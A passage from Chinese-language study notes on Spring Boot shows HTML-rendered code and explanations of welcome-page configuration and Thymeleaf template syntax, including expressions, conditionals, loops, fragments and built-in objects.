style="color: #61AFEF">getInterceptors</span><span style="color: #ABB2BF">(mvcConversionService, mvcResourceUrlProvider));</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">handlerMapping</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setCorsConfigurations</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getCorsConfigurations</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> handlerMapping</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        }</span></span></code></pre></div></div></figure><p>意思就是说，要在静态资源的配置文件里面写index.html<br>让 Spring Boot 应用在访问根路径（如 <code>http://localhost:8080/</code>）时能自动展示欢迎页（通常是 <code>index.html</code> 或模板引擎渲染的首页）</p></li><li><p>也可以使用templates目录下存放index.html</p><p>而且templates只能通过controller跳转，而且需要<strong>模板引擎</strong>支持（需要导入jar包）</p></li></ul><h2 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h2><p><strong>thymreleaf</strong></p><h3 id="使用演示"><a href="#使用演示" class="headerlink" title="使用演示"></a>使用演示</h3><ul><li><p>流程图</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251031155723490.png" alt="image-20251031155716381"></p></li><li><p>作用</p><p>后台封装一些数据，是动态的，写一些表达式——-&gt;把这个模板和这个数据交给我们模板引擎</p><p>解析并且移动到指定位置</p><p>（不同模板引擎，思想相同；只是语法有点区别）</p></li><li><p>使用</p><ol><li><p>引入（通过网址）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251031160639186.png" alt="image-20251031160639136"></p><p>导入pom.xml包中，自动会下载依赖</p></li><li><p>在index.html中写前端页面</p><ul><li><p>先写controller</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.springframework.stereotype.Controller</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.springframework.ui.Model</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.springframework.web.bind.annotation.RequestMapping</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">//在templates目录下的所有页面，只能通过controller来跳转！</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//这个需要模板引擎的支持！ thymeleaf</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Controller</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">IndexController</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">RequestMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/test&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">String</span><span style="color: #61AFEF"> test</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Model</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">model</span><span style="color: #ABB2BF">){</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">model</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addAttribute</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;msg&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;hello,springboot&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;test&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>通过”msg”传参”hello,springboot”</p></li><li><p>写html</p><figure class="shiki html"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;!</span><span style="color: #E06C75">DOCTYPE</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">html</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">html</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">lang</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;en&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">xmlns:th</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;http://www.thymeleaf.org&quot;</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">head</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">meta</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">charset</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;UTF-8&quot;</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">title</span><span style="color: #ABB2BF">&gt;Title&lt;/</span><span style="color: #E06C75">title</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">head</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">body</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">&lt;!--所有的html元素都可以被 thymeleaf替换接管；  th：元素名--&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">div</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:text</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;${msg}&quot;</span><span style="color: #ABB2BF">&gt;&lt;/</span><span style="color: #E06C75">div</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">body</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">html</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure><p>如果只写<code>text=&quot;$&#123;msg&#125;</code>传不进去值</p></li></ul></li></ol></li></ul><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>Thymeleaf 官网：<a href="https://www.thymeleaf.org/">https://www.thymeleaf.org/</a> 直接在官网看帮助文档</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251031165832765.png" alt="img"></p><h4 id="基础语法：变量与表达式"><a href="#基础语法：变量与表达式" class="headerlink" title="基础语法：变量与表达式"></a>基础语法：变量与表达式</h4><p>Thymeleaf 通过 <code>th:</code> 前缀标识动态属性，最核心的是 <strong><code>$&#123;...&#125;</code></strong> 表达式（用于获取变量值）</p><ol><li><p>输出变量（文本替换）</p><figure class="shiki html"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">&lt;!-- 输出变量值到文本中 --&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">p</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:text</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;${user.name}&quot;</span><span style="color: #ABB2BF">&gt;默认文本（未渲染时显示）&lt;/</span><span style="color: #E06C75">p</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">&lt;!-- 输出到标签的属性中（如 value、href） --&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">input</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">type</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;text&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:value</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;${user.age}&quot;</span><span style="color: #ABB2BF"> /&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">a</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:href</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;${linkUrl}&quot;</span><span style="color: #ABB2BF">&gt;链接&lt;/</span><span style="color: #E06C75">a</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure><ul><li><code>th:text</code>：替换标签内的文本内容（会转义特殊字符，如 <code>&lt;</code> 变为 <code>&lt;</code>）</li><li><code>th:utext</code>：不转义特殊字符（适合输出 HTML 片段，谨慎使用，防止 XSS）</li></ul></li><li><p>表达式类型</p><table><thead><tr><th>表达式</th><th>作用</th><th align="left">示例</th></tr></thead><tbody><tr><td><code>$&#123;...&#125;</code></td><td>变量表达式（获取模型中的数据）</td><td align="left"><code>$&#123;user.name&#125;</code>、<code>$&#123;list.size()&#125;</code></td></tr><tr><td><code>*&#123;...&#125;</code></td><td>选择变量表达式（简化对象属性访问）</td><td align="left"><code>&lt;div th:object=&quot;$&#123;user&#125;&quot;&gt;&lt;span th:text=&quot;*&#123;name&#125;&quot;&gt;&lt;/span&gt;&lt;/div&gt;</code>（等价于 <code>$&#123;user.name&#125;</code>）</td></tr><tr><td><code>#&#123;...&#125;</code></td><td>消息表达式（国际化配置，读取 properties）</td><td align="left"><code>#&#123;user.title&#125;</code>（读取 i18n 配置文件中的 <code>user.title</code> 键值）</td></tr><tr><td><code>@&#123;...&#125;</code></td><td>链接表达式（处理 URL，自动拼接上下文路径）</td><td align="left"><code>&lt;a th:href=&quot;@&#123;/user/detail(id=$&#123;userId&#125;)&#125;&quot;&gt;详情&lt;/a&gt;</code>（生成 <code>/项目上下文/user/detail?id=123</code>）</td></tr></tbody></table></li></ol><h4 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h4><ol><li><p><code>th:if</code> 和 <code>th:unless</code></p><figure class="shiki html"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">&lt;!-- 条件成立时显示标签 --&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">p</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:if</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;${user.age &gt;= 18}&quot;</span><span style="color: #ABB2BF">&gt;成年&lt;/</span><span style="color: #E06C75">p</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">&lt;!-- 条件不成立时显示标签（与 th:if 相反） --&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">p</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:unless</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;${user.age &gt;= 18}&quot;</span><span style="color: #ABB2BF">&gt;未成年&lt;/</span><span style="color: #E06C75">p</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure><ul><li>判定规则：数值 <code>0</code>、<code>null</code>、<code>false</code>、空集合会被视为 <code>false</code>，其他为 <code>true</code></li></ul></li><li><p><code>th:switch</code> + <code>th:case</code></p><figure class="shiki html"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">div</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:switch</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;${user.role}&quot;</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">  &lt;</span><span style="color: #E06C75">p</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:case</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;&#39;ADMIN&#39;&quot;</span><span style="color: #ABB2BF">&gt;管理员&lt;/</span><span style="color: #E06C75">p</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">  &lt;</span><span style="color: #E06C75">p</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:case</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;&#39;USER&#39;&quot;</span><span style="color: #ABB2BF">&gt;普通用户&lt;/</span><span style="color: #E06C75">p</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">  &lt;</span><span style="color: #E06C75">p</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:case</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;*&quot;</span><span style="color: #ABB2BF">&gt;其他角色&lt;/</span><span style="color: #E06C75">p</span><span style="color: #ABB2BF">&gt; </span><span style="color: #7F848E; font-style: italic">&lt;!-- * 表示默认值 --&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">div</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure></li></ol><h4 id="循环遍历"><a href="#循环遍历" class="headerlink" title="循环遍历"></a>循环遍历</h4><p>用 <code>th:each</code> 遍历集合（列表、数组、Map 等）：</p><ol><li>遍历列表</li></ol>   <figure class="shiki html"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">ul</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #7F848E; font-style: italic">&lt;!-- 遍历 users 集合，每次迭代的元素为 user --&gt;</span></span><span class="line"><span style="color: #ABB2BF">  &lt;</span><span style="color: #E06C75">li</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:each</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;user : ${users}&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:text</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;${user.name}&quot;</span><span style="color: #ABB2BF">&gt;&lt;/</span><span style="color: #E06C75">li</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">ul</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure><ol start="2"><li>获取迭代状态</li></ol><p>   遍历中可通过 <code>状态变量</code> 获取索引、是否为第一个 &#x2F; 最后一个等信息：</p>   <figure class="shiki html"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">ul</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #7F848E; font-style: italic">&lt;!-- 状态变量格式：变量名 + Stat（如 userStat） --&gt;</span></span><span class="line"><span style="color: #ABB2BF">  &lt;</span><span style="color: #E06C75">li</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:each</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;user, userStat : ${users}&quot;</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">    索引：&lt;</span><span style="color: #E06C75">span</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:text</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;${userStat.index}&quot;</span><span style="color: #ABB2BF">&gt;&lt;/</span><span style="color: #E06C75">span</span><span style="color: #ABB2BF">&gt; </span><span style="color: #7F848E; font-style: italic">&lt;!-- 从 0 开始 --&gt;</span></span><span class="line"><span style="color: #ABB2BF">    序号：&lt;</span><span style="color: #E06C75">span</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:text</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;${userStat.count}&quot;</span><span style="color: #ABB2BF">&gt;&lt;/</span><span style="color: #E06C75">span</span><span style="color: #ABB2BF">&gt; </span><span style="color: #7F848E; font-style: italic">&lt;!-- 从 1 开始 --&gt;</span></span><span class="line"><span style="color: #ABB2BF">    名称：&lt;</span><span style="color: #E06C75">span</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:text</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;${user.name}&quot;</span><span style="color: #ABB2BF">&gt;&lt;/</span><span style="color: #E06C75">span</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">span</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:if</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;${userStat.first}&quot;</span><span style="color: #ABB2BF">&gt;（第一个）&lt;/</span><span style="color: #E06C75">span</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">span</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:if</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;${userStat.last}&quot;</span><span style="color: #ABB2BF">&gt;（最后一个）&lt;/</span><span style="color: #E06C75">span</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">  &lt;/</span><span style="color: #E06C75">li</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">ul</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure><h4 id="属性操作"><a href="#属性操作" class="headerlink" title="属性操作"></a>属性操作</h4><ol><li><p>动态设置属性</p><figure class="shiki html"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">&lt;!-- 动态添加 class 属性 --&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">div</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:class</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;${isActive ? &#39;active&#39; : &#39;inactive&#39;}&quot;</span><span style="color: #ABB2BF">&gt;状态&lt;/</span><span style="color: #E06C75">div</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">&lt;!-- 多个 class 条件 --&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">div</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:classappend</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;${isError ? &#39;error&#39; : &#39;&#39;}&quot;</span><span style="color: #ABB2BF">&gt;提示&lt;/</span><span style="color: #E06C75">div</span><span style="color: #ABB2BF">&gt; </span><span style="color: #7F848E; font-style: italic">&lt;!-- 追加 class --&gt;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">&lt;!-- 动态设置 style --&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">p</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:style</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;&#39;color: &#39; + ${color} + &#39;; font-size: 16px&#39;&quot;</span><span style="color: #ABB2BF">&gt;文本&lt;/</span><span style="color: #E06C75">p</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure></li><li><p>布尔属性（如 checked、disabled）</p><figure class="shiki html"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">&lt;!-- 条件为 true 时，添加 checked 属性 --&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">input</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">type</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;checkbox&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:checked</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;${isAgree}&quot;</span><span style="color: #ABB2BF"> /&gt;</span></span></code></pre></div></div></figure></li></ol><h4 id="片段复用（模板布局）"><a href="#片段复用（模板布局）" class="headerlink" title="片段复用（模板布局）"></a>片段复用（模板布局）</h4><p>通过 <code>th:fragment</code> 定义可复用片段，再用 <code>th:insert</code>&#x2F;<code>th:replace</code> 引入</p><ol><li>定义片段（如在 <code>footer.html</code> 中）</li></ol><figure class="shiki html"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">&lt;!-- 定义名为 &quot;footerFragment&quot; 的片段 --&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">footer</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:fragment</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;footerFragment&quot;</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">  &lt;</span><span style="color: #E06C75">p</span><span style="color: #ABB2BF">&gt;© 2024 我的网站&lt;/</span><span style="color: #E06C75">p</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">footer</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure><ol start="2"><li>引入片段（在其他页面中）</li></ol><figure class="shiki html"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">&lt;!-- 引入片段：th:insert（保留自身标签，片段作为子元素） --&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">div</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:insert</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;footer :: footerFragment&quot;</span><span style="color: #ABB2BF">&gt;&lt;/</span><span style="color: #E06C75">div</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">&lt;!-- th:replace（用片段替换自身标签） --&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">div</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:replace</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;footer :: footerFragment&quot;</span><span style="color: #ABB2BF">&gt;&lt;/</span><span style="color: #E06C75">div</span><span style="color: #ABB2BF">&gt; </span><span style="color: #7F848E; font-style: italic">&lt;!-- 最终渲染为 &lt;footer&gt;...&lt;/footer&gt; --&gt;</span></span></code></pre></div></div></figure><ul><li><code>footer</code> 是模板文件名（无需 <code>.html</code> 后缀），<code>footerFragment</code> 是片段名。</li></ul><h4 id="内置对象"><a href="#内置对象" class="headerlink" title="内置对象"></a>内置对象</h4><p>Thymeleaf 提供了许多内置对象，方便处理数据：</p><ul><li><p><code>#strings</code>：字符串工具（<code>#strings.isEmpty(str)</code>、<code>#strings.toUpperCase(str)</code> 等）。</p></li><li><p><code>#numbers</code>：数字格式化（<code>#numbers.formatDecimal(num, 2, 2)</code> 保留两位小数）。</p></li><li><p><code>#dates</code>：日期处理（<code>#dates.format(date, &#39;yyyy-MM-dd&#39;)</code>）。</p></li><li><p><code>#lists</code>：集合工具（<code>#lists.size(list)</code>、<code>#lists.contains(list, obj)</code> 等）。</p><figure class="shiki html"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">p</span><span style="color: #ABB2BF">&gt;大写名称：&lt;</span><span style="color: #E06C75">span</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:text</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;${#strings.toUpperCase(user.name)}&quot;</span><span style="color: #ABB2BF">&gt;&lt;/</span><span style="color: #E06C75">span</span><span style="color: #ABB2BF">&gt;&lt;/</span><span style="color: #E06C75">p</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">p</span><span style="color: #ABB2BF">&gt;格式化日期：&lt;</span><span style="color: #E06C75">span</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:text</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;${#dates.format(user.birthday, &#39;yyyy年MM月dd日&#39;)}&quot;</span><span style="color: #ABB2BF">&gt;&lt;/</span><span style="color: #E06C75">span</span><span style="color: #ABB2BF">&gt;&lt;/</span><span style="color: #E06C75">p</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure></li></ul><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>Thymeleaf 有两种注释：</p><ol><li><p>标准 HTML 注释（会被浏览器解析，但 Thymeleaf 会忽略）：</p><figure class="shiki html"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">&lt;!-- 这是普通 HTML 注释 --&gt;</span></span></code></pre></div></div></figure></li><li><p>Thymeleaf 专属注释（不会被浏览器解析，仅模板引擎可见）：</p><figure class="shiki html"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">&lt;!--/* 这是 Thymeleaf 注释，渲染后不会显示 */--&gt;</span></span></code></pre></div></div></figure></li></ol><h3 id="MVC配置原理（模板）"><a href="#MVC配置原理（模板）" class="headerlink" title="MVC配置原理（模板）"></a>MVC配置原理（模板）</h3><ul><li><p>依旧先看官方文档</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">Spring</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">MVC</span><span style="color: #E06C75"> Auto</span><span style="color: #56B6C2">-</span><span style="color: #E06C75">configuration</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// Spring Boot为Spring MVC提供了自动配置，它可以很好地与大多数应用程序一起工作。</span></span><span class="line"><span style="color: #E5C07B">Spring</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Boot</span><span style="color: #E06C75"> provides auto</span><span style="color: #56B6C2">-</span><span style="color: #E06C75">configuration </span><span style="color: #C678DD">for</span><span style="color: #E06C75"> </span><span style="color: 